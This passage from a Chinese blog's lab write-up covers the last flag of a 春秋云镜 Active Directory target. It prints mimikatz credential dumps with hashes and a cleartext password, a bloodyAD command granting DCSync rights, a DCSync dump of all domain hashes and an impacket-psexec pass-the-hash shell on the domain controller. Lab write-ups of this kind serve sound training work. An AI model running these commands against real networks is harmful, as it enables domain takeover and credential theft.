8c03f31f89359af762fe0f271a0d61a64ef6eca1</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 91296 (00000000:000164a0)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : chenglei</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : WIN-DC</span><br><span class="line">Logon Time        : 2025/4/27 15:43:55</span><br><span class="line">SID               : S-1-5-21-3269458654-3569381900-10559451-1105</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : chenglei</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 0c00801c30594a1b8eaa889d237c5382</span><br><span class="line">         * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7</span><br><span class="line">         * DPAPI    : 89b179dc738db098372c365602b7b0f4</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : chenglei</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : chenglei</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : Xt61f3LBhg1</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 53263 (00000000:0000d00f)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/4/27 15:43:53</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : b5cd3591a58e1169186bcdbfd4b6322d</span><br><span class="line">         * SHA1     : 226ee6b5e527e5903988f08993a2456e3297ee1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : `k+hcEDFvtzoObj=&gt;DvzxiNqwyEn;Eu-\zFVAh&gt;.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB&#x27;LLG6wSx6TR%m;` Nfr;; Hf8O&#x27;Szfl0Z = w+^,&gt; 0jR</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN-HAUWOLAO$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/4/27 15:43:53</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25</span><br><span class="line">         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win-hauwolao$</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 24185 (00000000:00005e79)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/4/27 15:43:52</span><br><span class="line">SID               :</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25</span><br><span class="line">         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 11159180 (00000000:00aa468c)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : lv</span><br><span class="line">Domain            : WIN-HAUWOLAO</span><br><span class="line">Logon Server      : WIN-HAUWOLAO</span><br><span class="line">Logon Time        : 2025/4/27 16:53:43</span><br><span class="line">SID               : S-1-5-21-2057596273-973658165-3030246172-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : lv</span><br><span class="line">         * Domain   : WIN-HAUWOLAO</span><br><span class="line">         * NTLM     : 85edf6aacad2ac8e2a7a44741eb0b236</span><br><span class="line">         * SHA1     : aab02ea07aee541e9f60a1f6d5a54a2045965743</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : lv</span><br><span class="line">         * Domain   : WIN-HAUWOLAO</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : lv</span><br><span class="line">         * Domain   : WIN-HAUWOLAO</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 91297 (00000000:000164a1)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : chenglei</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : WIN-DC</span><br><span class="line">Logon Time        : 2025/4/27 15:43:55</span><br><span class="line">SID               : S-1-5-21-3269458654-3569381900-10559451-1105</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : chenglei</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 0c00801c30594a1b8eaa889d237c5382</span><br><span class="line">         * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7</span><br><span class="line">         * DPAPI    : 89b179dc738db098372c365602b7b0f4</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : chenglei</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : chenglei</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : Xt61f3LBhg1</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/4/27 15:43:53</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 53235 (00000000:0000cff3)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/4/27 15:43:53</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25</span><br><span class="line">         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN-HAUWOLAO$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/4/27 15:43:52</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win-hauwolao$</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">mimikatz # \</span><br></pre></td></tr></table></figure>

<p>拿到了一个域内用户 <code>chenglei</code>，查看 chenglei 的域内权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\flag &gt; net user chenglei /domain</span><br><span class="line">这项请求将在域 xiaorang.lab 的域控制器处理。</span><br><span class="line">用户名                 chenglei</span><br><span class="line">全名                   </span><br><span class="line">注释                   </span><br><span class="line">用户的注释             </span><br><span class="line">国家/地区代码          000 (系统默认值)</span><br><span class="line">帐户启用               Yes</span><br><span class="line">帐户到期               从不</span><br><span class="line">上次设置密码           2023/7/11 14:57:52</span><br><span class="line">密码到期               从不</span><br><span class="line">密码可更改             2023/7/12 14:57:52</span><br><span class="line">需要密码               Yes</span><br><span class="line">用户可以更改密码       Yes</span><br><span class="line">允许的工作站           All</span><br><span class="line">登录脚本               </span><br><span class="line">用户配置文件           </span><br><span class="line">主目录                 </span><br><span class="line">上次登录               2025/4/27 16:57:57</span><br><span class="line">可允许的登录小时数     All</span><br><span class="line">本地组成员             </span><br><span class="line">全局组成员             *ACL Admin            * Domain Users         </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<p>属于 ACL Admin 组，这个组有 WriteDACL 的权限，给 chenglei 去添加 DCSync 权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/123]</span><br><span class="line">└─# bloodyAD --host 172.22.13.6 -d &quot;XIAORANG.LAB&quot; -u chenglei -p Xt61f3LBhg1 add dcsync &quot;chenglei&quot;</span><br><span class="line">[+] chenglei is now able to DCSync</span><br></pre></td></tr></table></figure>

<p>然后用 chenglei 远程登录 mimikatz 抓取域内哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump:: dcsync /domian: xiaorang.lab /all /csv</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;WIN-DC.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">1104    zhangwen        fa7d776fdfc82d3f43c9d8b7f5312d77        512</span><br><span class="line">502     krbtgt  cb976ec1a1bf8a14a15142c6fecc540e        514</span><br><span class="line">1106    zhangtao        e786c4a4987ced162c496d0519496729        512</span><br><span class="line">1000    WIN-DC$ 5a5c8ad1abcec444c534563d7db5c332        532480</span><br><span class="line">500     Administrator   6341235defdaed66fb7b682665752c9a        512</span><br><span class="line">1105    chenglei        0c00801c30594a1b8eaa889d237c5382        512</span><br><span class="line">1103    WIN-HAUWOLAO$   00f24a2e0e0076b23f55b10e54d4cc25        4096</span><br></pre></td></tr></table></figure>

<p>然后横向就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/123]</span><br><span class="line">└─# impacket-psexec  -hashes : 6341235defdaed66fb7b682665752c9a Administrator@172.22.13.6</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 172.22.13.6.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file hUqShSba.exe</span><br><span class="line">[*] Opening SVCManager on 172.22.13.6.....</span><br><span class="line">[*] Creating service PuTe on 172.22.13.6.....</span><br><span class="line">[*] Starting service PuTe.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">[-] Decoding error detected, consider running chcp.com at the target,</span><br><span class="line">map the result with https://docs.python.org/3/library/codecs.html#standard-encodings</span><br><span class="line">and then execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line">Microsoft Windows [� 汾 10.0.20348.1787]</span><br><span class="line"></span><br><span class="line">[-] Decoding error detected, consider running chcp.com at the target,</span><br><span class="line">map the result with https://docs.python.org/3/library/codecs.html#standard-encodings</span><br><span class="line">and then execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line">(c) Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32 &gt;</span><br></pre></td></tr></table></figure>

<p>flag4 在 C:\Users\Administrator\flag 下</p>
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <span itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</span>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
            
            
                <div class="post-actions text-center clearfix" id="post-actions">
                
                    <a class="donate" href="javascript:;" onclick="krOpenDonateModal()"><i class="fa fa-bitcoin"></i> 打赏</a>
                
                
                    <a class="share" href="javascript:;" onclick="krOpenShareModal()"><i class="fa fa-share-alt"></i> 分享</a>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a>
                </div>
                <div class="pull-date">
                    <time datetime="2025-04-29T03:23:01.542Z" itemprop="dateModified">最后编辑：2025-04-29</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" HackmyVM-Driftingblues9" href="/2025/04/24/HackmyVM-Driftingblues9/"><i class="fa fa-angle-left"></i> 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" HackmyVM-Dejavu" href="/2025/04/29/HackmyVM-Dejavu/">下一篇 <i class="fa fa-angle-right"></i></a>
            </div>
            
        </nav>
    
    
        <div class="comment-post">
            
        </div>
    
</article>

        

            </section>

            
                

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/touxiang.jpg" alt="lvzhouhang" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                78
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                24
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                16
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class" >
    <div class="photo-background"></div>
    <h4 class="widget-title no-after">
        <i class="fa fa-compass"></i>
        文章目录
        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
    </h4>
    <div class="textwidget">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG01"><span class="toc-text">FLAG01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG02"><span class="toc-text">FLAG02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG03"><span class="toc-text">FLAG03</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG04"><span class="toc-text">FLAG04</span></a></li></ol>
    </div>
</aside>
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>分类列表</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/660930334/">660930334</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BugKu/">BugKu</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/BugKu/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTB/">HTB</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HackMyVM/">HackMyVM</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA/">JAVA</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/MISC/">MISC</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/MISC/NSSCTF/">NSSCTF</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/MISC/NSSCTF/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/boot2root/">boot2root</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/%E5%A4%8D%E7%9B%98/">复盘</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/">ctfshow</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/">php特性</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/%E5%88%B7%E9%A2%98/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/ctfshow/">ctfshow</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/ctfshow/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a><span class="category-list-count">10</span></li></ul>
  </aside>


            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/BugKu/" style="font-size: 0.6em;">BugKu</a> <a href="/tags/JAVA/" style="font-size: 0.6em;">JAVA</a> <a href="/tags/MISC/" style="font-size: 0.6em;">MISC</a> <a href="/tags/NSSCTF/" style="font-size: 0.6em;">NSSCTF</a> <a href="/tags/ctf/" style="font-size: 0.7em;">ctf</a> <a href="/tags/ctfshow/" style="font-size: 0.73em;">ctfshow</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 0.68em;">php特性</a> <a href="/tags/sql/" style="font-size: 0.65em;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.63em;">sql注入</a> <a href="/tags/vulnhub/" style="font-size: 0.63em;">vulnhub</a> <a href="/tags/web/" style="font-size: 0.75em;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.6em;">代码审计</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.6em;">内网</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 0.78em;">刷题</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.6em;">文件包含</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 0.8em;">靶机</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/2025/05/09/HTB-Titanic/"><i class="fa fa-book"></i> HTB-Titanic</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/05/08/HackmyVM-Learn2Code/"><i class="fa fa-book"></i> HackmyVM-Learn2Code</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/05/07/HackmyVM-Five/"><i class="fa fa-book"></i> HackmyVM-Five</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/05/06/HackmyVM-Djinn/"><i class="fa fa-book"></i> HackmyVM-Djinn</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/05/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Flarum/"><i class="fa fa-book"></i> 春秋云镜-Flarum</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>
            

        

                </div>
    </div>
</div>

<footer>
    <div id="footer">
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        
                            <li>
                                <a href="https://github.com/kratos-rebirth" target="_blank" rel="nofollow">
                                    <i class="fa fa-github"></i>
                                </a>
                            </li>
                        
                            <li>
                                <a href="/atom.xml" target="_blank" rel="nofollow">
                                    <i class="fa fa-rss"></i>
                                </a>
                            </li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2025 lvzhouhang 版权所有.</li>
